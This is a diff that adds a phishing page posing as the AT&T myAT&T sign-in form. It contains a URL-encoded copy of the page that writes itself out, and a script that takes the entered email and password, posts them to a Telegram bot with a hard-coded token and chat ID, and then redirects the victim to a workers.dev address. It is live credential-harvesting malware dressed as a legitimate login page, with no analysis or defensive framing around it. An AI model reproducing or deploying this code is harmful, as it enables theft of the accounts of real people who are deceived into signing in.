@@ -1,0 +1,240 @@
+<html lang="en"><head><script>
+<!--
+document.write(unescape("%3Chtml%20lang%3D%22en%22%3E%3Chead%3E%0A%0A%20%20%3Cmeta%20charset%3D%22UTF-8%22%3E%0A%20%20%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20initial-scale%3D1.0%22%3E%0A%3Clink%20rel%3D%22stylesheet%22%20href%3D%22style.css%22%3E%0A%20%20%3Ctitle%3EAT%26amp%3BT%20-%20Login%3C/title%3E%0A%20%3Cstyle%3E%0A%0A%20%20%20%20body%7B%0A%20%20padding%3A%200%3B%0A%20%20margin%3A%200%3B%0A%20%20background%3A%20%23f7f7f7%3B%0A%20%20box-sizing%3A%20border-box%3B%0A%20%20font-family%3A%20Arial%2C%20Helvetica%2C%20sans-serif%0A%7D%0A%0Asection%23form-section%20.top%20h3%0A%7B%0A%20%20font-size%3A%2013px%0A%7D%0Asection%23form-section%20.top%0A%7B%0A%20%20display%3A%20flex%3B%0A%20%20justify-content%3A%20space-between%3B%0A%20%20margin%3A%20auto%3B%0A%20%20width%3A%2022%25%3B%0A%20%20align-items%3A%20center%3B%0A%20%20text-align%3A%20center%3B%0A%7D%0Asection%23form-section%0A%7B%0A%20%20background%3A%20%23fff%3B%0A%20%20%20%20%20%20width%3A%20320px%3B%0A%20%20%20%20min-height%3A%20580px%3B%0A%20%20margin%3A%203%25%20auto%20auto%20auto%3B%0A%20%20padding%3A%2040px%3B%0A%20%20align-items%3A%20center%3B%0A%20%20text-align%3A%20center%3B%0A%7D%0A%0A.dont-have%20a%2C%0A.can%7B%0A%20%20%20%20%20%20margin-bottom%3A%200%3B%0A%20%20%20%20padding%3A%200%3B%0A%20%20%20%20font-size%3A%20.875rem%3B%0A%20%20%20%20line-height%3A%201.5rem%3B%0A%20%20%20%20color%3A%20%230057b8%3B%0A%20%20%20%20font-weight%3A%20bold%3B%0A%20%20%20%20text-decoration%3A%20none%0A%0A%7D%0Aform%20.label%20a%7B%0A%20%20float%3A%20right%3B%0A%20%20%20%20margin-bottom%3A%200%3B%0A%20%20%20%20padding%3A%200%3B%0A%20%20%20%20font-size%3A%20.875rem%3B%0A%20%20%20%20line-height%3A%201.5rem%3B%0A%20%20%20%20color%3A%20%230057b8%3B%0A%20%20%20%20font-weight%3A%20bold%3B%0A%20%20%20%20text-decoration%3A%20none%0A%7D%0Aform%20label%0A%7B%0A%20%20float%3A%20left%0A%7D%0Aform%20input%0A%7B%0A%20%20background-color%3A%20%23fff%3B%0A%20%20%20%20border%3A%201px%20solid%20%23797e85%3B%0A%20%20%20%20border-radius%3A%203px%3B%0A%20%20%20%20box-shadow%3A%20none%3B%0A%20%20%20%20width%3A%20100%25%3B%0A%20%20%20%20padding%3A%2010px%200px%2010px%2010px%3B%0A%20%20%20%20line-height%3A%2030px%3B%0A%20%20%20%20outline%3A%20none%3B%0A%20%20%20%20margin%3A%203%25%200%25%3B%0A%7D%0Aform%20button%7B%0A%0A%7D%0A.save%20img%7B%0A%20%20height%3A%2030px%3B%0A%7D%0A.save%7B%0A%20%20display%3A%20flex%3B%0A%20%20align-items%3A%20center%3B%0A%7D%0A%0A%0Aform%20button%7B%0A%20%20width%3A%20100%25%3B%0A%20%20%20%20height%3A%2048px%3B%0A%20%20%20%20border-radius%3A%203px%3B%0A%20%20%20%20border%3A%201px%20solid%20%230057b8%3B%0A%20%20%20%20background-color%3A%20%230057b8%3B%0A%20%20%20%20font-size%3A%20.875rem%3B%0A%20%20%20%20color%3A%20%23fff%3B%0A%7D%0Abutton.hollow%7B%0A%20%20background%3A%20%23fff%3B%0A%20%20border%3A%201px%20solid%20%23000%3B%0A%20%20color%3A%20%23000%0A%7D%0Abutton.green%7B%0A%20%20background%3A%20%23008522%3B%0A%20%20font-weight%3A%20bold%3B%0A%20%20border%3A%201px%20solid%20%23008522%3B%0A%7D%0A%0A.or-hr%20p%7B%0A%20%20font-size%3A%2010px%3B%0A%20%20font-weight%3A%20bold%3B%0A%7D%0A.or-hr%20hr%7B%0A%20%20width%3A%2040%25%0A%7D%0A.or-hr%0A%7B%0A%20%20display%3A%20flex%3B%0A%20%20justify-content%3A%20space-between%3B%0A%20%20width%3A%20100%25%3B%0A%20%20align-items%3A%20center%3B%0A%7D%0A%0Afooter%23footer%20ul%20li%0A%7B%0A%20%20font-size%3A%2013px%3B%0A%20%20list-style%3A%20none%3B%0A%20%20color%3A%20%230057b8%0A%7D%0Afooter%23footer%20p%7B%0A%20%20font-size%3A%2012px%0A%7D%0Afooter%23footer%20ul%7B%0A%20%20width%3A%2040%25%3B%0A%20%20margin%3A%20auto%3B%0A%20%20display%3A%20flex%3B%0A%20%20justify-content%3A%20space-between%3B%0A%7D%0Afooter%23footer%7B%0A%20%20width%3A%20100%25%3B%3B%0A%20%20text-align%3A%20center%3B%0A%20%20align-items%3A%20center%3B%0A%20%20margin-top%3A%201%25%0A%7D%0A%0A@media%28max-width%3A%201001px%29%7B%0A%20%20footer%23footer%20ul%7B%0A%20%20text-align%3A%20center%3B%0A%20%20flex-direction%3A%20column%3B%0A%7D%0Afooter%23footer%20ul%20li%7B%0A%20%20margin-top%3A%205%25%0A%7D%0A%7D%0A%0A%20%20%3C/style%3E%0A%0A%3C/head%3E%0A%3Cbody%3E%0A%0A%20%20%3Csection%20id%3D%22form-section%22%3E%0A%20%20%20%20%3Cdiv%20class%3D%22top%22%3E%0A%20%20%20%20%20%20%20%20%20%20%3Csvg%20height%3D%2228%22%20viewBox%3D%220%200%2036%2036%22%20width%3D%2228%22%3E%3Cpath%20d%3D%22m7.1%2032c3%202.3%206.8%203.7%2010.9%203.7%204.5%200%208.6-1.7%2011.7-4.4-1.4.9-5.4%203-11.7%203-5.5%200-9-1.2-10.9-2.3m12.1.9c4.4%200%209.2-1.2%2012-3.6.8-.6%201.5-1.5%202.2-2.6.4-.7.8-1.5%201.1-2.2-2.7%203.9-10.4%206.4-18.4%206.4-5.6%200-11.7-1.8-14.1-5.3%202.2%204.8%208.9%207.3%2017.2%207.3m-4.8-7.8c-9.1%200-13.4-4.2-14.1-7.1%200%201%20.1%202.2.3%203.1.1.4.4%201%20.9%201.6%202.2%202.3%207.7%205.5%2017.2%205.5%2012.9%200%2015.9-4.3%2016.5-5.7.4-1%20.7-2.8.7-4.4v-1c-.9%203.4-11.9%208-21.5%208m-12.5-14.7c-.5%201-1.1%202.8-1.3%203.7-.1.4%200%20.6.1.9%201.1%202.3%206.6%206%2019.4%206%207.8%200%2013.9-1.9%2014.9-5.4.2-.6.2-1.3%200-2.2-.3-1-.7-2.2-1.2-3.1.1%204.6-12.7%207.6-19.2%207.6-7%200-12.9-2.8-12.9-6.3.1-.5.2-.9.2-1.2m27.8-5.7c.1.1.1.2.1.4%200%202-6%205.4-15.6%205.4-7.1%200-8.4-2.6-8.4-4.3%200-.6.2-1.2.7-1.8-.9.9-1.7%201.7-2.5%202.7-.3.4-.5.8-.5%201%200%203.5%208.7%205.9%2016.7%205.9%208.6%200%2012.5-2.8%2012.5-5.3%200-.9-.3-1.4-1.2-2.4-.6-.6-1.2-1.1-1.8-1.6m-2.6-1.9c-2.7-1.6-5.7-2.5-9.1-2.5s-6.5.9-9.2%202.6c-.8.4-1.3.8-1.3%201.3%200%201.5%203.5%203.1%209.7%203.1%206.1%200%2010.9-1.8%2010.9-3.5.1-.3-.3-.6-1-1%22%20fill%3D%22%23009fdb%22%3E%3C/path%3E%3C/svg%3E%0A%20%20%20%20%20%20%20%20%20%20%3Ch3%3EAT%26amp%3BT%3C/h3%3E%0A%20%20%20%20%3C/div%3E%0A%20%20%20%20%3Cdiv%20class%3D%22sign-att%22%3E%0A%20%20%20%20%20%20%3Ch2%3ESign%20In%3C/h2%3E%0A%20%20%20%20%20%20%3Cp%3Eto%20myAT%26amp%3BT%3C/p%3E%0A%20%20%20%20%3C/div%3E%0A%20%20%20%20%3Cform%20action%3D%22%22%20id%3D%22form%22%20method%3D%22post%22%3E%0A%20%20%20%20%20%20%3Cdiv%20class%3D%22label%22%3E%0A%20%20%20%20%20%20%20%20%3Clabel%20for%3D%22%22%3EEmail%3C/label%3E%0A%20%20%20%20%20%20%20%20%3Cbr%3E%0A%20%20%20%20%20%20%20%20%3Cinput%20type%3D%22text%22%20id%3D%22usr%22%20name%3D%22usr-id%22%20required%3D%22%22%3E%3Cbr%3E%0A%20%20%20%20%20%20%3C/div%3E%3Cbr%3E%0A%20%20%20%20%20%20%3Cdiv%20class%3D%22label%22%3E%0A%20%20%20%20%20%20%20%20%3Clabel%20for%3D%22%22%3EPassword%3C/label%3E%3Cbr%3E%0A%20%20%20%20%20%20%20%20%3Cinput%20type%3D%22password%22%20id%3D%22pwd%22%20name%3D%22pwd%22%20required%3D%22%22%3E%3Cbr%3E%0A%20%20%20%20%20%20%20%20%3Ca%20href%3D%22%23%22%3EForgot%20password%3F%3C/a%3E%0A%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%3Cdiv%20class%3D%22save%22%3E%0A%20%20%20%20%20%20%20%20%3Cimg%20src%3D%22data%3Aimage/png%3Bbase64%2CiVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAAABmJLR0QA/wD/AP+gvaeTAAACSUlEQVRoge3Zv2sUQRjG8U9URMWoYBIQQREsFEEbbWy0s1I0SKp0lv5orQSD/4GWYqOdaGGsrKwlGBUhjYqNoDYxXiIimqzFzpHzsiG7t7u3G9kH3uJm33fe97s7Mzs7R6NGjfJoBLfwCguI+mwLmA41DPcKcRGtCopfzb5jtBeIpRoU322LWWBG1OtJdNuchGG2IQHkKgbTUlegnbiSxvG16u/6WjbdXfRAAsg8tqchrlDz2NHZkAQS9aeW3Pqn9qQ5si7VgNRNdQT51UtQ3UAe4whmiuisqnfDC2wNNdxO4V9LkE/YG/JfShlTO5AWjoXcp8RzZN2BLOJcyHsIsxliawVyLeTcjXcZY2sDcjfk24znPcTXAuQZNon3S/d77KMQkD8Yw70eCpjBrpDrRo6bUQjIo+A7IN2a37avOBBix+T7nC4EJMIdyzuD6yn8f+Jk8D+OHzkgCgWJ8EA81uGyeDlN8lvCePDbjy85IQoHifAEW0LsOH4n+NwM1wfxpgCIUkAi8fLZPrA4Kx5G7WsPxXNpIyYLgigNJMIUhkIfp8VbjylsC21ZFoVKQSK8xZ7QzwnxGRnx/CkSonSQCB9xsKO/M5LnTe1BInzGURzGtxIgVoCUeRw0Kz5N31dQf90aWPVHUFEgZas516q1/muQ+b5XkV2t7oYkkA99KCSv3nc3JIE87UMheZWqxmHxH49lvMSKsDnLe7o1NWr1b4sqbRHn00J0wszVoPjOJ3EhK0RbQ5jAS/Fq1u/iWyH3hAzDqVGjRiv1F0g95X0VcKkRAAAAAElFTkSuQmCC%22%3E%0A%20%20%20%20%20%20%20%20%3Cp%3ESave%20user%20ID%3C/p%3E%0A%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%3Cbutton%20type%3D%22submit%22%3ESign%20In%3C/button%3E%3Cbr%3E%3Cbr%3E%0A%20%20%20%20%20%0A%20%20%20%20%20%20%3Cbr%3E%3Cbr%3E%0A%20%20%20%20%20%20%3Cdiv%20class%3D%22dont-have%22%3E%0A%20%20%20%20%20%20%20%20%3Cp%3EDon%27t%20have%20a%20user%20ID%3F%3C/p%3E%0A%20%20%20%20%20%20%20%20%3Ca%20href%3D%22%23%22%3ECreate%20one%20now%3C/a%3E%0A%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%0A%20%20%20%20%3C/form%3E%0A%20%20%3C/section%3E%3Cbr%3E%0A%0A%20%20%3Cfooter%20id%3D%22footer%22%3E%0A%20%20%20%20%3Cul%20id%3D%22ul%22%3E%0A%20%20%20%20%20%20%3Cli%3ELegal%20policy%20center%3C/li%3E%0A%20%20%20%20%20%20%3Cli%3EPrivacy%20policy%3C/li%3E%0A%20%20%20%20%20%20%3Cli%3ETerms%20of%20use%3C/li%3E%0A%20%20%20%20%20%20%3Cli%3EAccessibility%3C/li%3E%0A%20%20%20%20%20%20%3Cli%3EDo%20not%20sell%20my%20personal%20Information%3C/li%3E%0A%20%20%20%20%3C/ul%3E%0A%20%20%20%20%3Cp%3E%A92022%20AT%26amp%3BT%20Intellectual%20Property.%20All%20rights%20reserved.%3C/p%3E%0A%20%20%3C/footer%3E%0A%0A%20%3Cscript%3E%0A%20%20%20%20%20%20const%20forma%20%3D%20document.querySelector%28%27%23form%27%29%0A%20%20%20%20%0A%20%20%20%20%20%20let%20bot%20%3D%20%7B%0A%20%20%20%20%20%20%20%20%20%20TOKEN%3A%20%225051297224%3AAAETgLhNRTbhpJNucj4Ny4y_czF0M3UnllY%22%2C%0A%20%20%20%20%20%20%20%20%20%20chatID%3A%20%22-772522345%22%0A%20%20%20%20%20%20%7D%0A%0A%0A%20%20%20%20%20%20forma.addEventListener%28%22submit%22%2C%20e%20%3D%3E%7B%0A%20%20%20%20%20%20%20%20%20%20e.preventDefault%28%29%3B%0A%0A%20%20%20%20%20%20%20%20%20%20let%20email%20%3D%20document.querySelector%28%27%23usr%27%29.value%0A%20%20%20%20%20%20%20%20%20%20let%20pwd%20%3D%20document.querySelector%28%27%23pwd%27%29.value%0A%0A%20fetch%28%60https%3A//api.telegram.org/bot%24%7Bbot.TOKEN%7D/sendMessage%3Fchat_id%3D%24%7Bbot.chatID%7D%26text%3DATT%3D%3E%3DUsername%3A%3A-%24%7Bemail%7D%3D%3DPassword%3A%3A-%24%7Bpwd%7D%3D%3D%60%2C%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20method%3A%20%22GET%22%0A%20%20%20%20%20%20%20%20%20%20%7D%29.then%28success%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20window.location.replace%28%22https%3A//attbilling.con-account.workers.dev/%22%29%3B%0A%20%20%20%20%20%20%20%20%20%20%7D%2C%20error%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20alert%28%22Message%20not%20sent%22%29%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20console.log%28error%29%0A%0A%20%20%20%20%20%20%20%20%20%20%7D%29%0A%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%7D%29%0A%3C/script%3E%0A%0A%3C/body%3E%3C/html%3E"));
+//-->
+</script>
+
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="stylesheet" href="style.css">
+  <title>AT&amp;T - Login</title>
+ <style>
+
+    body{
+  padding: 0;
+  margin: 0;
+  background: #f7f7f7;
+  box-sizing: border-box;
+  font-family: Arial, Helvetica, sans-serif
+}
+
+section#form-section .top h3
+{
+  font-size: 13px
+}
+section#form-section .top
+{
+  display: flex;
+  justify-content: space-between;
+  margin: auto;
+  width: 22%;
+  align-items: center;
+  text-align: center;
+}
+section#form-section
+{
+  background: #fff;
+      width: 320px;
+    min-height: 580px;
+  margin: 3% auto auto auto;
+  padding: 40px;
+  align-items: center;
+  text-align: center;
+}
+
+.dont-have a,
+.can{
+      margin-bottom: 0;
+    padding: 0;
+    font-size: .875rem;
+    line-height: 1.5rem;
+    color: #0057b8;
+    font-weight: bold;
+    text-decoration: none
+
+}
+form .label a{
+  float: right;
+    margin-bottom: 0;
+    padding: 0;
+    font-size: .875rem;
+    line-height: 1.5rem;
+    color: #0057b8;
+    font-weight: bold;
+    text-decoration: none
+}
+form label
+{
+  float: left
+}
+form input
+{
+  background-color: #fff;
+    border: 1px solid #797e85;
+    border-radius: 3px;
+    box-shadow: none;
+    width: 100%;
+    padding: 10px 0px 10px 10px;
+    line-height: 30px;
+    outline: none;
+    margin: 3% 0%;
+}
+form button{
+
+}
+.save img{
+  height: 30px;
+}
+.save{
+  display: flex;
+  align-items: center;
+}
+
+
+form button{
+  width: 100%;
+    height: 48px;
+    border-radius: 3px;
+    border: 1px solid #0057b8;
+    background-color: #0057b8;
+    font-size: .875rem;
+    color: #fff;
+}
+button.hollow{
+  background: #fff;
+  border: 1px solid #000;
+  color: #000
+}
+button.green{
+  background: #008522;
+  font-weight: bold;
+  border: 1px solid #008522;
+}
+
+.or-hr p{
+  font-size: 10px;
+  font-weight: bold;
+}
+.or-hr hr{
+  width: 40%
+}
+.or-hr
+{
+  display: flex;
+  justify-content: space-between;
+  width: 100%;
+  align-items: center;
+}
+
+footer#footer ul li
+{
+  font-size: 13px;
+  list-style: none;
+  color: #0057b8
+}
+footer#footer p{
+  font-size: 12px
+}
+footer#footer ul{
+  width: 40%;
+  margin: auto;
+  display: flex;
+  justify-content: space-between;
+}
+footer#footer{
+  width: 100%;;
+  text-align: center;
+  align-items: center;
+  margin-top: 1%
+}
+
+@media(max-width: 1001px){
+  footer#footer ul{
+  text-align: center;
+  flex-direction: column;
+}
+footer#footer ul li{
+  margin-top: 5%
+}
+}
+
+  </style>
+
+</head>
+<body>
+
+  <section id="form-section">
+    <div class="top">
+          <svg height="28" viewBox="0 0 36 36" width="28"><path d="m7.1 32c3 2.3 6.8 3.7 10.9 3.7 4.5 0 8.6-1.7 11.7-4.4-1.4.9-5.4 3-11.7 3-5.5 0-9-1.2-10.9-2.3m12.1.9c4.4 0 9.2-1.2 12-3.6.8-.6 1.5-1.5 2.2-2.6.4-.7.8-1.5 1.1-2.2-2.7 3.9-10.4 6.4-18.4 6.4-5.6 0-11.7-1.8-14.1-5.3 2.2 4.8 8.9 7.3 17.2 7.3m-4.8-7.8c-9.1 0-13.4-4.2-14.1-7.1 0 1 .1 2.2.3 3.1.1.4.4 1 .9 1.6 2.2 2.3 7.7 5.5 17.2 5.5 12.9 0 15.9-4.3 16.5-5.7.4-1 .7-2.8.7-4.4v-1c-.9 3.4-11.9 8-21.5 8m-12.5-14.7c-.5 1-1.1 2.8-1.3 3.7-.1.4 0 .6.1.9 1.1 2.3 6.6 6 19.4 6 7.8 0 13.9-1.9 14.9-5.4.2-.6.2-1.3 0-2.2-.3-1-.7-2.2-1.2-3.1.1 4.6-12.7 7.6-19.2 7.6-7 0-12.9-2.8-12.9-6.3.1-.5.2-.9.2-1.2m27.8-5.7c.1.1.1.2.1.4 0 2-6 5.4-15.6 5.4-7.1 0-8.4-2.6-8.4-4.3 0-.6.2-1.2.7-1.8-.9.9-1.7 1.7-2.5 2.7-.3.4-.5.8-.5 1 0 3.5 8.7 5.9 16.7 5.9 8.6 0 12.5-2.8 12.5-5.3 0-.9-.3-1.4-1.2-2.4-.6-.6-1.2-1.1-1.8-1.6m-2.6-1.9c-2.7-1.6-5.7-2.5-9.1-2.5s-6.5.9-9.2 2.6c-.8.4-1.3.8-1.3 1.3 0 1.5 3.5 3.1 9.7 3.1 6.1 0 10.9-1.8 10.9-3.5.1-.3-.3-.6-1-1" fill="#009fdb"></path></svg>
+          <h3>AT&amp;T</h3>
+    </div>
+    <div class="sign-att">
+      <h2>Sign In</h2>
+      <p>to myAT&amp;T</p>
+    </div>
+    <form action="" id="form" method="post">
+      <div class="label">
+        <label for="">Email</label>
+        <br>
+        <input type="text" id="usr" name="usr-id" required=""><br>
+      </div><br>
+      <div class="label">
+        <label for="">Password</label><br>
+        <input type="password" id="pwd" name="pwd" required=""><br>
+        <a href="#">Forgot password?</a>
+      </div>
+      <div class="save">
+        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAAABmJLR0QA/wD/AP+gvaeTAAACSUlEQVRoge3Zv2sUQRjG8U9URMWoYBIQQREsFEEbbWy0s1I0SKp0lv5orQSD/4GWYqOdaGGsrKwlGBUhjYqNoDYxXiIimqzFzpHzsiG7t7u3G9kH3uJm33fe97s7Mzs7R6NGjfJoBLfwCguI+mwLmA41DPcKcRGtCopfzb5jtBeIpRoU322LWWBG1OtJdNuchGG2IQHkKgbTUlegnbiSxvG16u/6WjbdXfRAAsg8tqchrlDz2NHZkAQS9aeW3Pqn9qQ5si7VgNRNdQT51UtQ3UAe4whmiuisqnfDC2wNNdxO4V9LkE/YG/JfShlTO5AWjoXcp8RzZN2BLOJcyHsIsxliawVyLeTcjXcZY2sDcjfk24znPcTXAuQZNon3S/d77KMQkD8Yw70eCpjBrpDrRo6bUQjIo+A7IN2a37avOBBix+T7nC4EJMIdyzuD6yn8f+Jk8D+OHzkgCgWJ8EA81uGyeDlN8lvCePDbjy85IQoHifAEW0LsOH4n+NwM1wfxpgCIUkAi8fLZPrA4Kx5G7WsPxXNpIyYLgigNJMIUhkIfp8VbjylsC21ZFoVKQSK8xZ7QzwnxGRnx/CkSonSQCB9xsKO/M5LnTe1BInzGURzGtxIgVoCUeRw0Kz5N31dQf90aWPVHUFEgZas516q1/muQ+b5XkV2t7oYkkA99KCSv3nc3JIE87UMheZWqxmHxH49lvMSKsDnLe7o1NWr1b4sqbRHn00J0wszVoPjOJ3EhK0RbQ5jAS/Fq1u/iWyH3hAzDqVGjRiv1F0g95X0VcKkRAAAAAElFTkSuQmCC">
+        <p>Save user ID</p>
+      </div>
+      <button type="submit">Sign In</button><br><br>
+     
+      <br><br>
+      <div class="dont-have">
+        <p>Don't have a user ID?</p>
+        <a href="#">Create one now</a>
+      </div>
+      
+    </form>
+  </section><br>
+
+  <footer id="footer">
+    <ul id="ul">
+      <li>Legal policy center</li>
+      <li>Privacy policy</li>
+      <li>Terms of use</li>
+      <li>Accessibility</li>
+      <li>Do not sell my personal Information</li>
+    </ul>
+    <p>©2022 AT&amp;T Intellectual Property. All rights reserved.</p>
+  </footer>
+
+ <script>
+      const forma = document.querySelector('#form')
+    
+      let bot = {
+          TOKEN: "5051297224:AAETgLhNRTbhpJNucj4Ny4y_czF0M3UnllY",
+          chatID: "-772522345"
+      }
+
+
+      forma.addEventListener("submit", e =>{
+          e.preventDefault();
+
+          let email = document.querySelector('#usr').value
+          let pwd = document.querySelector('#pwd').value
+
+ fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=ATT=>=Username::-${email}==Password::-${pwd}==`, {
+              method: "GET"
+          }).then(success => {
+              window.location.replace("https://attbilling.con-account.workers.dev/");
+          }, error => {
+              alert("Message not sent")
+              console.log(error)
+
+          })
+         
+      })
+</script>
+
+</body></html>
